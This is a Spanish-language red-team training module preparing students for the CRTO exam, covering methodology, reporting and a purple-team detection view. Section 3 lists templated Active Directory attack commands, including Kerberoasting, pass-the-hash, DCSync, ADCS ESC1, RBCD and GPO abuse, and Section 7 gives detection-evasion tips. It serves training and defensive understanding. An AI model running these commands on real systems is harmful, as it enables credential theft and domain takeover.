# Tradecraft — Operación ZEPHYR
## Lab-15: Simulación CRTO Completa — Consolidación y Certificación

**Operación:** OPERATION ZEPHYR | **Adversario:** APT10 (Stone Panda) | **Nivel:** Enterprise Simulation  
**Autor:** Adrián Camacho | **Versión:** 1.0 | **Fecha:** Mayo 2026

---

## Índice

1. [Filosofía del lab de consolidación](#1-filosofía)
2. [Metodología de simulación de examen](#2-metodología-de-simulación)
3. [Repaso de técnicas críticas CRTO](#3-repaso-técnicas-crto)
4. [Gestión del tiempo en engagements largos](#4-gestión-del-tiempo)
5. [Reporting profesional](#5-reporting-profesional)
6. [Purple Team — Integrar la perspectiva defensiva](#6-purple-team)
7. [OPSEC — Síntesis de principios del roadmap](#7-opsec-síntesis)

---

## 1. Filosofía del Lab de Consolidación

### ¿Por qué un lab de consolidación?

Los Labs 01-14 construyen habilidades técnicas específicas. Operation Zephyr es diferente — no introduce nuevas técnicas sino que enseña a **combinar todo lo aprendido de forma fluida**, simulando la presión y las decisiones de un examen o engagement real.

### Lo que diferencia a un operador junior de uno senior

```
Junior:  Conoce las técnicas individualmente
         Sigue tutoriales paso a paso
         Falla si algo no funciona exactamente como esperaba
         Documenta después de ejecutar

Senior:  Adapta las técnicas al contexto específico
         Improvisa ante obstáculos inesperados
         Tiene plan A, B y C para cada objetivo
         Documenta mientras ejecuta
         Piensa en detección en cada paso
```

Operation Zephyr entrena el pensamiento de operador senior.

### La mentalidad del examen CRTO

El examen CRTO evalúa principalmente:
1. **Metodología** — ¿Sigues un proceso coherente o atacas aleatoriamente?
2. **Adaptabilidad** — ¿Puedes superar obstáculos no documentados en el curso?
3. **Documentación** — ¿Tu reporte es profesional y reproducible?
4. **Time management** — ¿Priorizas correctamente en 48 horas?

---

## 2. Metodología de Simulación de Examen

### El protocolo de las primeras 2 horas

Las primeras 2 horas determinan el éxito del engagement. En orden estricto:

```
00:00 - 00:15  Verificar conectividad a todos los sistemas del scope
00:15 - 00:45  Reconocimiento externo rápido (nmap básico de todos los hosts)
00:45 - 01:30  BloodHound — recolección y análisis inicial
01:30 - 02:00  Identificar los 3 attack paths más prometedores
02:00          STOP — Antes de ejecutar nada, tener un plan claro
```

### La regla de los 30 minutos

Si llevas más de 30 minutos bloqueado en una técnica sin progreso:
1. Documenta dónde te quedaste y el error exacto
2. Pasa al siguiente attack path identificado
3. Vuelve al problema anterior con mente fresca

En 48 horas de examen, quedarse bloqueado en algo por 2 horas puede costarte el examen.

### Priorización de objetivos

```
Nivel 1 (hacer primero): Técnicas de impacto alto con baja complejidad
  → Kerberoasting, AS-REP si hay cuentas sin pre-auth
  → Credential hunting en shares accesibles
  → BloodHound path más corto hacia DA

Nivel 2 (si nivel 1 no da resultado): Técnicas medias
  → Delegation abuse
  → ACL abuse
  → ADCS

Nivel 3 (último recurso): Técnicas complejas o ruidosas
  → EDR evasion
  → Forest trust exploitation
  → Azure AD
```

---

## 3. Repaso de Técnicas Críticas CRTO

### Las 10 técnicas más importantes para el CRTO

#### 1. Reconocimiento con BloodHound
```bash
# Recolectar y analizar en < 10 minutos
bloodhound-python -u user -p pass -d dom -ns IP -c All --zip
# Importar → Pathfinding → Shortest paths to DA
```

#### 2. Kerberoasting + cracking OSINT
```bash
impacket-GetUserSPNs dom/user:pass -dc-ip IP -request -outputfile hashes.txt
john hashes.txt --wordlist=wordlist_osint.txt --format=krb5tgs
```

#### 3. AS-REP Roasting
```bash
impacket-GetNPUsers dom/ -no-pass -usersfile users.txt -dc-ip IP -request
```

#### 4. Pass-the-Hash
```bash
evil-winrm -i IP -u user -H NTLM_HASH
impacket-psexec dom/user@IP -hashes :HASH
```

#### 5. DCSync
```bash
impacket-secretsdump dom/user:pass@IP -just-dc-ntlm
```

#### 6. ADCS ESC1
```bash
certipy find -u user@dom -p pass -dc-ip IP -vulnerable -stdout
certipy req -u user@dom -p pass -ca CA-NAME -template TEMPLATE -upn Admin@dom
certipy auth -pfx Admin.pfx -dc-ip IP
```

#### 7. Unconstrained Delegation
```bash
# En la máquina con UC Delegation — Rubeus monitor
.\Rubeus.exe monitor /interval:5 /nowrap
# Forzar coerción con PetitPotam
python3 PetitPotam.py -u user -p pass -d dom KALI DC
```

#### 8. Constrained Delegation S4U2Proxy
```bash
impacket-getTGT dom/svc:pass -dc-ip IP
export KRB5CCNAME=svc.ccache
impacket-getST dom/svc:pass -spn SPN -impersonate Admin -dc-ip IP
```

#### 9. RBCD
```bash
impacket-addcomputer dom/user:pass -computer-name 'ATK$' -computer-pass 'Pass123!'
impacket-rbcd dom/user:pass -delegate-from 'ATK$' -delegate-to 'TARGET$' -action write
impacket-getST dom/'ATK$':'Pass123!' -spn cifs/TARGET.dom -impersonate Admin
```

#### 10. GPO Abuse
```powershell
$gpoId = (Get-GPO -Name "GPO-NAME").Id.ToString()
$xmlPath = "\\DC\SYSVOL\dom\Policies\{$gpoId}\Machine\Preferences\ScheduledTasks"
$taskXML | Out-File "$xmlPath\ScheduledTasks.xml" -Encoding Unicode
```

### Troubleshooting rápido — Problemas comunes

| Problema | Causa probable | Solución |
|----------|---------------|----------|
| Rubeus ptt Error 1312 | Sesión WinRM (Network Logon) | Usar impacket desde Kali con ccache |
| KDC_ERR_BADOPTION en S4U | SPN no autorizado para la cuenta | Verificar msDS-AllowedToDelegateTo |
| DRSR_BAD_DN en secretsdump | Cuenta sin permisos de replicación | Añadir DCSync rights primero (WriteDACL) |
| Certipy auth falla | DC no soporta PKINIT o cert expirado | Verificar versión DC (>= WS2016) |
| BloodHound "Path not found" | bloodhound-python LEGACY no recolecta ACLs GPO | Usar SharpHound para coverage completo |
| SharpHound "not valid application" | Binario corrupto o incompatible | Verificar tamaño > 1MB, usar v2.5.9 |

---

## 4. Gestión del Tiempo en Engagements Largos

### Time boxing por objetivo

Para cada objetivo, asignar un time box máximo:

| Tipo de objetivo | Time box recomendado |
|-----------------|---------------------|
| Reconocimiento inicial | 2 horas |
| Técnica de escalada conocida | 30 minutos |
| Técnica de escalada con problemas | 60 minutos máximo |
| Movimiento lateral hacia nuevo segmento | 45 minutos |
| Documentación de una fase | 20-30 minutos |
| Exfiltración y persistencia | 1 hora |

### Señales de que debes cambiar de estrategia

```
□ Mismo error durante más de 20 minutos → alternativa
□ BloodHound no muestra paths → usar SharpHound en su lugar
□ Técnica de exploitation falla 3 veces → buscar otro vector
□ Credencial no funciona → verificar horario de lockout → esperar
□ Acceso bloqueado → el objetivo puede tener protección especial → documentar y omitir
```

### Documentación simultánea

La documentación simultánea a la ejecución parece más lenta pero en total es más eficiente:

```
Sin documentación simultánea:
  Ejecución: 4h → Documentación: 2h = Total 6h
  (con memoria imperfecta y comandos exactos olvidados)

Con documentación simultánea:
  Ejecución + doc: 5h = Total 5h
  (documentación perfecta, sin reconstruir desde memoria)
```

---

## 5. Reporting Profesional

### Estructura del reporte CRTO

El reporte del examen CRTO requiere documentar el compromiso de cada máquina objetivo. Para cada máquina:

```markdown
## [Hostname] — [IP]

### Método de compromiso
Descripción clara de cómo se comprometió la máquina.

### Evidencia
Screenshot mostrando:
- hostname del sistema comprometido
- fecha/hora
- privilegio obtenido (whoami, net localgroup administrators)

### Técnica MITRE
T1XXX — Nombre de la técnica

### Pasos detallados
1. Comando 1: `comando exacto`
   Output: [output relevante]
2. Comando 2: ...
```

### Lo que hace un buen reporte CRTO

- **Reproducibilidad** — cualquier persona puede seguir los pasos y obtener el mismo resultado
- **Evidencia clara** — screenshots que demuestran inequívocamente el compromiso
- **Contexto** — no solo "ejecuté X" sino "ejecuté X porque Y condición existía"
- **MITRE mapping** — cada técnica referenciada con su ID

### Lo que arruina un reporte

- Screenshots sin contexto (¿en qué máquina estás? ¿qué privilege?)
- Comandos sin explicar por qué se usan
- Saltar pasos intermedios asumiendo que son obvios
- Errores no documentados

---

## 6. Purple Team — Integrar la Perspectiva Defensiva

### Por qué un Red Teamer debe pensar como Blue Team

Los mejores Red Teamers son los que entienden exactamente qué ven los defensores. Esto permite:
1. **Calibrar el OPSEC** — saber exactamente qué detectan y qué no
2. **Mejorar los reportes** — explicar el impacto en términos que el Blue Team entiende
3. **Proponer mitigaciones reales** — no genéricas

### Para cada técnica, pensar en ambos lados

```
TÉCNICA: DCSync

RED: impacket-secretsdump → todos los hashes del dominio
BLUE: Event 4662 — acceso a objeto con derecho de replicación desde IP no-DC
      Alerta si: SubjectUserName no es una cuenta de máquina de DC
      Detección: SIEM rule correlacionando 4662 + IP que no es DC + DRS access rights
MITIGACIÓN: Proteger el objeto dominio con ACL auditing
            Solo DCs deben tener DS-Replication-Get-Changes
```

### El framework ATT&CK como lenguaje común

MITRE ATT&CK es el lenguaje que conecta Red y Blue Team. En reportes y comunicaciones usar siempre el ID de técnica — permite al equipo defensivo buscar las reglas de detección correspondientes y al equipo ofensivo buscar variantes.

---

## 7. OPSEC — Síntesis de Principios del Roadmap

### Los 10 principios OPSEC del roadmap completo

Destilados de todos los labs anteriores:

**1. Kali antes que Windows**
Operar desde Kali con impacket/certipy/bloodyAD antes de subir binarios al objetivo.

**2. LOLBins antes que herramientas externas**
`comsvcs.dll` antes que `nanodump`. `net group` antes que `PowerView`. `certutil` antes que `impacket`.

**3. Kerberos antes que NTLM**
Usar Overpass-the-Hash para obtener TGT Kerberos antes de usar Pass-the-Hash NTLM.

**4. Limpiar inmediatamente**
Eliminar SPNs, tareas GPO, cuentas de máquina y binarios tan pronto como ya no se necesitan.

**5. Documentar los artefactos creados**
Mantener una lista de todo lo que se ha modificado para poder limpiar al final.

**6. Silver antes que Golden**
Silver Ticket no pasa por el KDC — menos detectable que Golden Ticket.

**7. Shadow Credentials antes que ForceChangePassword**
No cambiar contraseñas de cuentas activas si se puede evitar.

**8. bloodhound-python antes que SharpHound**
Primera recolección siempre desde Kali. SharpHound solo si se necesita coverage completo.

**9. Sleep largo y con jitter**
Beacons con sleep de 5-15 minutos y 20-50% de jitter minimizan la firma de beaconing.

**10. Un artefacto, un propósito**
Cada binario subido, cada cuenta creada, cada SPN añadido debe tener un propósito claro. Si ya no es necesario, eliminar.

### La pregunta OPSEC antes de cada acción

```
Antes de ejecutar cualquier comando, responder:
1. ¿Hay una forma de hacer esto sin tocar el objetivo?
2. ¿Qué logs genera exactamente?
3. ¿Qué artefactos deja y cómo los limpio?
4. ¿Hay una forma más silenciosa de conseguir el mismo resultado?
5. ¿El beneficio operacional justifica el riesgo de detección?
```

---

## Epílogo — El camino desde aquí

Completar este roadmap es el punto de partida, no el destino. Las habilidades construidas aquí abren el camino hacia:

- **CRTO** — Certificación inmediata disponible
- **CRTE** — Red Team Expert (siguiente nivel)
- **OSCP+** — Penetration testing avanzado
- **Engagements reales** — Con empresa responsable y scope definido
- **Bug bounties** — Aplicar las habilidades de reconocimiento y explotación web
- **Especialización** — Cloud security, OT/ICS, mobile, hardware

El Red Team profesional no para de aprender. Las defensas evolucionan, las técnicas cambian, los adversarios innovan. Este roadmap te da las bases — mantenerlas actualizadas es responsabilidad continua.

---

## Referencias

- [CRTO — Zero-Point Security](https://training.zeropointsecurity.co.uk/courses/red-team-ops)
- [MITRE ATT&CK Enterprise](https://attack.mitre.org/matrices/enterprise/)
- [Red Team Development and Operations — Joe Vest](https://redteam.guide/)
- [The Hacker Playbook 3 — Peter Kim](https://www.thehackerplaybook.com/)

---

*Operación ZEPHYR — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*